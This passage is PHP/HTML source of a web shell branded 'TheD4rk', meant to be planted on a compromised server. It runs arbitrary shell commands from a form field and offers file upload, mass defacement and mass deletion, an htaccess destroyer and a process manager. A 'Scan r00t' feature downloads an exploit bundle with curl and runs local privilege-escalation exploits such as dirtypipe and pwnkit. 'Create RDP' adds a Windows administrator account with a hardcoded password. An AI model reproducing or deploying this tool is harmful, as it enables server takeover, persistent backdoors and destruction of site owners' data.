							<td style="width: 7%;">Permission</td>
							<td style="width: 1%">:</td>
							<td>[&nbsp;<?php echo wr($dark, pall($dark)) ?>&nbsp;]</td>
						</tr>
						<tr>
							<td style="width: 7%;">info</td>
							<td style="width: 1%">:</td>
							<td>&nbsp;<a href="?info" class="text-primary" target="_blank">phpinfo()</a></td>
						</tr>
						<tr>
							<td style="width: 7%;">Disable func</td>
							<td style="width: 1%">:</td>
							<td>&nbsp;<a href='#' class='text-primary' data-bs-toggle='modal' data-bs-target='#ds'>SHOW</a></td>
						</tr>
						<tr>
							<td style="width: 7%;">Directory</td>
							<td style="width: 1%">:</td>
							<td>
								<?php
									if (stristr(PHP_OS, "WIN")) {
										win();
									}

									foreach ($darks as $id => $pat) {
										if ($pat == '' && $id == 0) {
								?>
								<a class="text-light" href="?x=<?= hx('/') ?>">/</a>
								<?php } if ($pat == '') continue; ?>

								<a href="?x=<?php for ($i = 0; $i <= $id; $i++) { echo hx("$darks[$i]"); if ($i != $id) echo hx("/"); } ?>"><?= $pat ?></a> /
								<?php } ?>
								[ <a href="?x=<?= hx($_SERVER['DOCUMENT_ROOT']);?>"><i class="text-success bi bi-hdd-network-fill"></i></a> ]
							</td>
						</tr>
					</table>
				</div>
				<div class="col-md-auto mt-auto">
					<div class="row justify-content-end">
						<div class="col-md-auto">
							<table class="table-borderless">
								<tr>
									<td class="text-end">
										<form action="" method="post">
											<div class="input-group mb-3">
												<input type="text" style="width: 7%;" class="form-control form-control-sm" name="cmd" placeholder="whoami" value="<?= $_POST['cmd'];?>" required>
												<button type="submit" class="btn btn-outline-light btn-sm"><i class="bi bi-arrow-right"></i></button>
											</div>
										</form>
									</td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>
			<div class="container mb-3">
				<center>
					<a href="<?=$_SERVER['PHP_SELF'];?>" class="btn btn-outline-light custom-btn btn-sm mb-2"><i class="bi bi-house-fill"></i>&nbsp;Home</a>
					<button type="button" class="btn btn-outline-light btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#upload"><i class="bi bi-upload"></i>&nbsp;Upload</button>
					<button type="button" class="btn btn-outline-light btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#unzip"><i class="bi bi-file-earmark-zip"></i>&nbsp;Unzip</button>
					<button type="button" class="btn btn-outline-light btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#mass"><i class="bi bi-virus2"></i>&nbsp;Mass tools</button>
					<button type="button" class="btn btn-secondary btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#lockfile"><i class="bi bi-lock-fill"></i>&nbsp;Lockfile</button>
					<a href="?x=<?= hx($dark) ?>&lockshell" class="btn btn-secondary btn-sm custom-btn mb-2"><i class="bi bi-ubuntu"></i>&nbsp;Lockshell</a>
					<a href="?x=<?= hx($dark) ?>&unlockshell" class="btn btn-secondary btn-sm mb-2"><i class="bi bi-unlock-fill"></i>&nbsp;Unlock</a>
					<a href="?x=<?= hx($dark) ?>&showpm" class="btn btn-secondary btn-sm mb-2"><i class="bi bi-person-exclamation"></i>&nbsp;Process Manager</a>
					<a href="?x=<?= hx($dark) ?>&destroy" class="btn btn-danger btn-sm mb-2"><i class="bi bi-braces-asterisk"></i>&nbsp;Htaccess Destroyer</a>
					<a href="?x=<?= hx($dark) ?>&scanr00t" class="btn btn-danger custom-btn btn-sm mb-2"><i class="bi bi-bug"></i>&nbsp;Scan r00t</a>
					<a href="?x=<?= hx($dark) ?>&rdp" class="btn btn-danger custom-btn btn-sm mb-2"><i class="bi bi-windows"></i>&nbsp;Create RDP</a>
					<a href="?x=<?= hx($dark) ?>&adm" class="btn btn-warning custom-btn btn-sm mb-2"><i class="bi bi-database-up"></i>&nbsp;Adminer</a>
					<button type="button" class="btn btn-warning btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#scanshel"><i class="bi bi-shield-shaded"></i>&nbsp;Scan shell</button>
					<a href="?out" class="btn btn-outline-light btn-sm custom-btn mb-2"><i class="bi bi-box-arrow-left"></i>&nbsp;Logout</a>
				</center>
				<?php
					if(!empty($_POST['cmd'])) {
						$cmd = cmd($_POST['cmd'].' 2>&1');
						$xd = '<i class="bi bi-terminal modal-title fs-5"></i> TheD4rk<b class="text-success">@</b>'.$_SERVER['HTTP_HOST'].':# <div class="table-responsive text-success"><b>'.$_POST['cmd'].'</b></div><textarea class="form-control" rows="7">';
						if($cmd) {
							echo $xd. htmlspecialchars($cmd).'</textarea>';
						} else {
							echo $xd. 'No results.</textarea>';
						}
					}
					if (isset($_GET['scanr00t'])) {
						ob_implicit_flush();ob_end_flush();
						echo '
						<div class="text-center">
							<div class="btn-group py-2">
								<a class="btn btn-outline-light custom-btn btn-sm" href=?x='.hx($dark).'&scanr00t&id=autoscan><i class="bi bi-bug"></i>&nbsp;Auto Scan</a>
								<a class="btn btn-outline-light custom-btn btn-sm" href=?x='.hx($dark).'&scanr00t&id=scansuid><i class="bi bi-search"></i>&nbsp;Scan SUID</a>
							</div>
						</div>';
						if (!function_exists("proc_open")) {
							echo '<div class="container py-3"><div class="alert alert-danger">Command is Disable !!<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
						}
						if (!is_writable($dark)) {
							echo '<div class="container py-3"><div class="alert alert-danger">Current Directory is Unwriteable !!<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
						}
						if (isset($_GET['id']) && $_GET['id'] == "autoscan") {
							echo '<div class="text-center py-2">Scanning r00t..</div>';
							if (!file_exists($dark."/r00ting/")) {
								mkdir($dark."/r00ting");
								rut("curl https://raw.githubusercontent.com/pukimai1337/kebutuhan/main/auto.tar.gz -o auto.tar.gz", $dark."/r00ting");
								rut("tar -xf auto.tar.gz", $dark."/r00ting");
								if (!file_exists($dark."/r00ting/netfilter")) {
									rut("rm -rf r00ting", $dark);
									echo '<div class="container py-2"><div class="alert alert-danger">Failed to Download Material !!</div></div>';
								}
							}
							echo '<textarea class="form-control" rows="7">Netfilter : '.rut("timeout 10 ./r00ting/netfilter", $dark).'Ptrace : '.rut("echo id | timeout 10 ./r00ting/ptrace", $dark).'Sequoia : '.rut("timeout 10 ./r00ting/sequoia", $dark).'OverlayFS : '.rut("echo id | timeout 10 ./overlayfs", $dark."/r00ting").'Dirtypipe : '.rut("echo id | timeout 10 ./r00ting/dirtypipe /usr/bin/su", $dark).'Sudo : '.rut("echo 12345 | timeout 10 sudoedit -s Y", $dark).'Pwnkit : '.rut("echo id | timeout 10 ./pwnkit", $dark."/r00ting").'</textarea>';
						} elseif (isset($_GET['id']) && $_GET['id'] == "scansuid") {
							echo '<div class="text-center py-2">Scanning SUID..</div>';
							echo '<textarea class="form-control" rows="7">'.rut("find / -perm -u=s -type f 2>/dev/null", $dark).'</textarea>';
						}
					}

					if (isset($_GET['rdp'])) {
						if (!function_exists("proc_open")) {
							alert("Error!! failed to create user RDP, Command is Disable.", "#DC4C64", "?x=" . hx($dark));
						}
						if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			echo '<div class="text-center py-2">Create RDP..</div>
				<div class="table-responsive">
					<div class="btn-group py-2">
<pre>'.rut("net user thedark TheD4rk#1337 /add", $dark).rut("net localgroup administrators thedark /add", $dark).'
If there is no <span class="text-bg-danger">"Access is denied."</span> output
Chances are that you have succeeded in creating a user here. Just log in using the username and password below.
Hosts: <gr>'.gethostbyname($_SERVER["HTTP_HOST"]).'
Username: thedark
Password: TheD4rk#1337</pre>
					</div>
				</div>';
						} else {
							echo '<div class="container py-2 col-md-7"><div class="alert alert-danger alert-dismissible fade show"><strong>Error!!</strong> this tool only works for WIN servers.<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div></div>';
						}
					}
				?>
				<!-- Modal 1 -->
				<div class="modal fade" id="lockfile" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="massLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="massLabel"><i class="bi bi-lock-fill"></i>&nbsp;Lockfile</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
							<form action="" method="post">
								<label class="form-label">File name:</label>
								<div class="input-group mb-3">
									<input type="text" name="lockfile" class="form-control form-control-sm" placeholder="File to Lock">
									<button type="submit" name="submit" class="btn btn-outline-light btn-sm">Submit</button>
								</div>
							</form>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="ds" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="dsLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="dsLabel"><i class="bi bi-x-circle"></i>&nbsp;Disabled Functions Check</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<?php
									function getDS() {
										$disabled = ini_get('disable_functions');
										if (empty($disabled)) {
											return array();
										}
										return explode(',', $disabled);
									}
									$importantFunctions = array('exec', 'system', 'shell_exec', 'passthru', 'proc_open','popen', 'curl_exec', 'curl_multi_exec', 'parse_ini_file','show_source', 'symlink', 'putenv', 'mail', 'imap_mail', 'error_log', 'mb_send_mail', 'dl','chmod', 'chown', 'chgrp', 'link', 'fsockopen','pfsockopen', 'posix_kill', 'posix_mkfifo', 'posix_setpgid','posix_setsid', 'posix_setuid', 'pcntl_exec', 'imap_open','apache_setenv', 'proc_nice', 'proc_terminate', 'proc_get_status','escapeshellcmd', 'escapeshellarg', 'ini_restore', 'stream_socket_server', 'phpinfo');
									$disabledFunctions = getDS();
									$disabledImportant = array_intersect($importantFunctions, $disabledFunctions);
									?>
								<ul class="list-group">
									<li class="list-group-item bg-dark text-light d-flex justify-content-between align-items-start">
										<div class="fw-bold"><i class="bi bi-cpu text-warning"></i> TOTAL CHECKED</div>
										<span class="badge bg-primary rounded-pill"><?= count($importantFunctions) ?></span>
									</li>
									<li class="list-group-item bg-dark text-light d-flex justify-content-between align-items-center">
										<div class="fw-bold"><i class="bi bi-x-circle text-danger"></i> DISABLED</div>
										<span class="badge bg-primary rounded-pill"><?= count($disabledImportant) ?></span>
									</li>
									<li class="list-group-item bg-dark text-light d-flex justify-content-between align-items-center">
										<div class="fw-bold"><i class="bi bi-check-square text-success"></i> ENABLED</div>
										<span class="badge bg-primary rounded-pill"><?= count($importantFunctions) - count($disabledImportant) ?></span>
									</li>
								</ul>
								<div class="py-2">
									<div class="overflow-x-auto h-full max-h-[80vh]">
										<table class="table table-hover table-dark text-dark align-middle text-nowrap">
											<thead class="align-middle">
												<tr>
													<th class="px-2">Function</th>
													<th class="px-2">Status</th>
												</tr>
											</thead>
										<tbody class="table-group-divider">
											<?php foreach ($importantFunctions as $func) { ?>
												<tr>
													<td><span class="text-slate-400 px-2"><?= $func ?></span></td>
													<td>
													<?php if (in_array($func, $disabledFunctions)) { ?>
														<span class="badge text-bg-danger border-radius-0">DISABLED</span>
													<?php } else { ?>
														<span class="badge text-bg-success border-radius-0">ENABLED</span>
													<?php } ?>
													</td>
												</tr>
											<?php } ?>
										</tbody>
										</table>
									</div>
								</div>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mass" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="massLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="massLabel"><i class="bi bi-virus2"></i>&nbsp;Mass tools</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<form method='post'>
									<label class="form-label">Type mass:</label></br>
									<input class="form-check-input" type="radio" name="mass_type" value="singledir" checked>
									<label class="form-label">Mass singgel dir</label>
									<input class="form-check-input" type="radio" name="mass_type" value="alldir">
									<label class="form-label">Mass all dir</label>
									<input class="form-check-input" type="radio" name="mass_type" value="delete">
									<label class="form-label">Mass delete all</label>
									</br>
									<label class="form-label">Directory:</label>
									<input class="form-control mb-3" type="text" name="d_dir" value="<?=$dark;?>">
									<label class="form-label">File name:</label>
									<input class="form-control mb-3" type="text" name="d_file" placeholder="TheD4rk.php">
									<label class="form-label">Code file:</label>
									<textarea name="script" class="form-control mb-3" rows="7" placeholder="Hello World!"></textarea>
									<input class="btn btn-outline-primary btn-sm" type="submit" name="start" value="SUBMIT">
								</form>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="upload" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="uploadLabel" aria-hidden="true">
					<form action="" enctype="multipart/form-data" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="uploadLabel"><i class="bi bi-upload"></i>&nbsp;Upload</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<form action="" method="post">
									<label class="form-label">Upload Files:</label>
									<div class="input-group mb-3 py-2">
										<input type="file" class="form-control form-control-sm" name="z[]" multiple>
										<button class="btn btn-outline-light btn-sm" type="submit">Upload</button>
									</div>
								</form>
								<form action="" method="post">
									<label class="form-label">Upload form URL:</label>
									<input type="text" name="darilink" class="form-control form-control-sm" placeholder="https://example.com/file.txt">
										<div class="input-group mb-3 py-2">
										<input type="text" name="namelink" class="form-control form-control-sm" placeholder="file.txt">
										<input type="submit" name="thelink" class="btn btn-outline-light btn-sm" value="Upload">
									</div>
								</form>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="unzip" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="unzipLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="unzipLabel"><i class="bi bi-file-earmark-zip"></i>&nbsp;Unzip</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<form action="" method="post">
									<label class="form-label">Unzip Here:</label>
									<div class="input-group mb-2">
										<input type="text" class="form-control form-control-sm" name="file_zip" value="<?= $dark ?>/file.zip">
										<input type="submit" class="btn btn-outline-light btn-sm" name="unzip" value="Submit">
									</div>
								</form>
								<form action="" method="post">
									<label class="form-label">Unzip to Directory:</label>
									<div class="input-group mb-2">
										<input type="text" class="form-control form-control-sm" name="zip_dir" value="<?= $dark ?>/file.zip">
										<input type="submit" class="btn btn-outline-light btn-sm" name="unzipdir" value="Submit">
									</div>
								</form>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="scanshel" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="scanshelLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="scanshelLabel"><i class="bi bi-shield-shaded"></i>&nbsp;Scan shell</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<form action="" method="post">
									<label>Directory:</label>
										<input type="text" name="scan_dir" class="form-control form-control-sm" value="<?= isset($_POST['scan_dir']) ? htmlspecialchars($_POST['scan_dir']) : getcwd() ?>">
									<label>Type:</label>
									<div class="input-group mb-3">
										<select name="scan_type" class="form-select form-select-sm">
											<option value="quick">Quick Scan</option>
											<option value="deep">Deep Scan</option>
										</select>
									<input type="submit" name="start_scan" class="btn btn-outline-light btn-sm" value="Submit">
									</div>
								</form>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
							</div>
						</div>
					</form>
				</div>	
				<div class="modal fade" id="tambahFolder" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="createFoler" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="createFoler"><i class="bi bi-folder-plus"></i></h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close">&nbsp;Create directory</button>
							</div>
							<div class="modal-body">
								<label class="form-label">Folder name:</label>
								<input type="text" class="form-control" name="nfoln" placeholder="TheD4rk" required>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Create</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="tambahFile" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="createFile" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="createFile"><i class="bi bi-file-earmark-plus"></i>&nbsp;Create file</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<div class="mb-3">
									<label class="form-label">File name:</label>
									<input type="text" class="form-control" name="nfn" placeholder="TheD4rk.php" required>
								</div>
								<div class="mb-3">
									<label class="form-label">File content:</label>
									<textarea class="form-control" rows="7" name="nfc" placeholder="Hello World!"></textarea>
								</div>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Create</button>
							</div>
						</div>
					</form>
				</div>

				<!-- Modal 2 -->
				<div class="modal fade" id="em" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="emt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="emt"><i class="bi bi-file-earmark-code"></i>&nbsp;File</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<div class="mb-3">
									<?php
										if (isset($_GET['act']) && isset($_GET['item'])) {
											if ($_GET['act'] === 'ef') {
												$item = uhx($_GET['item']);
												if ($zzzz = getimagesize($dark . '/' . $item)) {
													$ab = base64_encode(file_get_contents($dark . '/' . $item));
									?>

									<p>Type: <?= $zzzz['mime'] ?>, <?= $zzzz['0'] ?> x <?= $zzzz['1'] ?></p>
									<center>
										<img class="img-fluid rounded" src="data:<?= $zzzz['mime'] ?>;base64, <?= $ab ?>" alt="<?= $item ?>">
									</center>
									<?php
										} else {
									?>

									<label class="form-label">File&nbsp;<font color="green"><?= $item ?></font></label>
									<textarea class="form-control" rows="15" name="nc" id="content"><?= htmlspecialchars(file_get_contents($dark . '/' . $item)) ?></textarea>
									<?php
												}
											}
										}
									?>
								</div>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
								<button type="button" class="btn btn-outline-light btn-sm" onclick="salin()">Copy</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="masken" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="emt" aria-hidden="true">
					<div class="modal-content bg-dark text-light modal-dialog">
						<div class="modal-header">
							<h1 class="modal-title fs-5" id="emt"><i class="bi bi-virus2"></i></h1>
							<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
						</div>
						<div class="modal-body">
							<div class="mb-3">
							<?php
							if($_POST['start']) {
								if($_POST['mass_type'] === 'singledir') {
									echo '<textarea class="form-control" rows="7" id="content">';
										massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
									echo '</textarea>';
								} elseif($_POST['mass_type'] === 'alldir') {
									echo '<textarea class="form-control" rows="7" id="content">';
										massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
									echo '</textarea>';
								} elseif($_POST['mass_type'] === "delete") {
									echo '<textarea class="form-control" rows="7" id="content">';
										massdelete($_POST['d_dir'], $_POST['d_file']);
									echo '</textarea>';
								}
						
							}
							?>
							</div>
						</div>
						<div class="modal-footer">
							<a href="?x=<?= hx($dark) ?>" class="btn btn-outline-primary btn-sm">Go back</a>
							<button type="button" class="btn btn-outline-light btn-sm" onclick="salin()">Copy</button>
						</div>
					</div>
				</div>
				<div class="modal fade" id="mr" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mrt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mrt"><i class="bi bi-pencil-square"></i>&nbsp;Rename</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">New name for <span id="rin" style="color: green"></span></label>
								<input type="text" class="form-control" name="nn" placeholder="TheD4rk">
								<input type="hidden" id="rinn" name="ri" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="md" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mdt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mdt"><i class="bi bi-trash"></i>&nbsp;Delete</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">Are you sure will delete <span id="din" style="color: green"></span> ?</label>
								<input type="hidden" id="dip" name="dl" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-light btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-danger btn-sm">Delete</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mdtw" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mdtwt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mdtwt"><i class="bi bi-calendar3"></i>&nbsp;Change Date</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">New date for <span id="dinn" style="color: green"></span></label>
								<input type="text" class="form-control" name="nd" placeholder="TheD4rk">
								<input type="hidden" id="dipp" name="di" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mp" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mpt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content bg-dark text-light">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mpt"><i class="bi bi-exclamation-triangle"></i>&nbsp;Change Permission</h1>
								<button type="button" class="btn-close bg-light" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">New perm for <span id="pin" style="color: green"></span></label>
								<input type="text" class="form-control" name="np" placeholder="TheD4rk">
								<input type="hidden" id="pip" name="pi" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Cancel</button>
								<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
							</div>
						</div>
					</form>
				</div>
			</div>
			Total <span class="badge text-bg-danger border-radius-0"><?=hdd('total') ?></span> Free <span class="badge text-bg-warning border-radius-0"><?=hdd('free') ?></span> Used <span class="badge text-bg-success border-radius-0"><?=hdd('used') ?></span>
			<?php
				if (isset($_POST['start_scan'])) {
					$scan_dir = $_POST['scan_dir'];
					$scan_type = $_POST['scan_type'];
					$malware_signatures = array(
						// Code Execution
						'eval(',
						'system(',
						'exec(',
						'shell_exec(',
						'passthru(',
						'popen(',
						'proc_open(',
						'nepo_corp',
						'curl',			
						// Obfuscation / Encoding
						'gzinflate(',
						'gzuncompress(',
						'base64_decode(',
						'hex2bin(',
						'str_rot13(',
						'chr(',
						'strrev(',
						'rawurldecode(',
						'unlink(',
						'rename(',
						'copy(',
						'move_uploaded_file(',
						'fopen(',
						'lruc',
						'goto',
						// I/O
						'file_put_contents(',
						'file_get_contents(',
						'url_get_contents(',
						'move_uploaded_file(',
						'$_FILES',
						// info 
						'getcwd',
						'php_uname(',
						'include("zip://',
					);

					function scan_directory($dir, $signatures, $deep = false) {
						$results = array();
						$files = scandir($dir);
						$chunk_size = 50; // Process files in chunks

						foreach (array_chunk($files, $chunk_size) as $chunk) {
							foreach ($chunk as $file) {
								if ($file == '.' || $file == '..') continue;
									$path = $dir . '/' . $file;
								if (is_dir($path) && $deep) {
									$sub_results = scan_directory($path, $signatures, $deep);
									$results = array_merge($results, $sub_results);
								} elseif (is_file($path)) {
									$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
									if (in_array($ext, array('php','php1','php2','php3','php4','php5','php6','php7','php8','php9','pht','phar','phtml','shtml'))) {
										$content = file_get_contents($path);
										foreach ($signatures as $sig) {
											if (strpos($content, $sig) !== false) {
												$results[] = array(
													'file' => $path,
													'signature' => $sig,
													'line' => find_line_number($content, $sig)
												);
												break;
											}
										}
									}
								}
							}
						}
						return $results;
					}

					function find_line_number($content, $search) {
						$lines = explode("\n", $content);
						foreach ($lines as $i => $line) {
							if (strpos($line, $search) !== false) {
								return $i + 1;
								}
							}
								return 'N/A';
							}
						$deep_scan = ($scan_type == 'deep');
						$scan_results = scan_directory($scan_dir, $malware_signatures, $deep_scan);
					if (count($scan_results) > 0) {
						ob_implicit_flush();ob_end_flush();
					?>
					<div class="overflow-x-auto h-full max-h-[80vh]">
						<table class="table table-hover table-dark align-middle text-nowrap">
							<thead class="align-middle">
								<tr>
									<td class="px-2"><i class="bi bi-file-earmark-code-fill"></i> File</td>
									<td class="px-5"><code><i class="bi bi-bug-fill"></i></code> Malware Type</td>
									<td class="px-5"><i class="bi bi-justify-left"></i> Line</td>
									<td class="px-5"><i class="bi bi-gear-wide-connected"></i> Action</th>
								</tr>
							</thead>
							<tbody class="table-group-divider">
							<?php foreach ($scan_results as $r): ?>
								<tr>
									<td class="px-4">
										<span class="block font-medium text-light"><?= htmlspecialchars(basename($r['file'])) ?></span>
										<small class="text-slate-400"><?= htmlspecialchars(dirname($r['file'])) ?></small>
									</td>
									<td class="px-5">
										<code><?= htmlspecialchars($r['signature']) ?></code>
									</td>
									<td class="px-5"><?= $r['line'] ?></td>
									<td class="px-5">
										<form action="" method="post" target="_blank">
											<div class="mb-3">
												<a href="?itemscan=<?= hx(htmlspecialchars($r['file'])) ?>" target="_blank" class="btn btn-outline-light btn-sm">
													<i class="bi bi-eye-fill"></i>
												</a>
												<input type="hidden" id="dip" name="dl" value="<?= htmlspecialchars($r['file']) ?>">
												<button type="submit" class="btn btn-outline-danger btn-sm">
													<i class="bi bi-trash"></i>
												</button>
											</div>
										</form>
									</td>
								</tr>
							<?php endforeach; ?>
							</tbody>
						</table>
					</div>
					<ul class="list-group">
						<li class="list-group-item list-group-item-danger d-flex justify-content-between align-items-start">
							<div class="fw-bold"><i class="bi bi-shield-exclamation"></i> potential malware files!</div>
							<span class="badge bg-primary rounded-pill">Found <?= count($scan_results) ?> File</span>
						</li>
					</ul>
				<?php
					} else {
				?>
				<ul class="list-group py-3">
					<li class="list-group-item list-group-item-dark d-flex justify-content-between align-items-start">
						<div class="fw-bold"><i class="bi bi-shield-check text-success"></i> No malware signatures found in scanned files.</div>
						<span class="badge bg-primary rounded-pill">Found <?= count($scan_results) ?> File</span>
					</li>
				</ul>
				<?php
					}
				?>
				<div class="text-center py-2">
					<?= $cpr ?>
				</div>
			<?php
					exit();
				}
			if (isset($_GET['showpm'])) {
			?>
				<div class="py-2">
					<div class="overflow-x-auto h-full max-h-[80vh]">
						<table class="table table-hover table-dark align-middle text-nowrap">
							<thead class="align-middle">
								<tr>
									<th class="px-2">PID</th>
									<th class="px-1">User</th>
									<th class="px-1">CPU %</th>
									<th class="px-1">MEM %</th>
									<th class="px-1">Command</th>
									<th class="px-2">Action</th>
								</tr>
							</thead>
							<tbody class="table-group-divider">
							<?php 
								$prcs = getProcessList();
								foreach ($prcs as $prc) {
							?>
								<tr>
									<td class="text-primary"><?= $prc['pid'] ?></td>
									<td class="text-success"><?= $prc['user'] ?></td>
									<td class="text-danger"><?= $prc['cpu'] ?></td>
									<td class="text-danger"><?= $prc['mem'] ?></td>
